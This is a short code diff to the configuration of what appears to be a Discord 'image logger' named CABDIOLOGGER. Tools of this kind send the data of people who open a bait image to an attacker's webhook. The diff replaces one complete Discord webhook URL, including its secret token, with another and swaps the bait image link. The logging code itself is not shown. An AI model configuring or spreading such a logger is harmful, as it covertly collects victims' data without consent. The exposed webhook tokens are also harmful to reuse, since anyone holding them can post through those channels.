@@ -11,8 +11,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "webhook": "https://discord.com/api/webhooks/1455991935360831647/tYQYaEUP43vRzCYfoJK-Wsbf2AtvyO0JoXBHu9TFkozoj7dTd6PVo9Pt4NKpXZjIhzKC",
+    "image": "https://i.pinimg.com/736x/ed/47/d8/ed47d84f358889f0b799606730bb2830.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
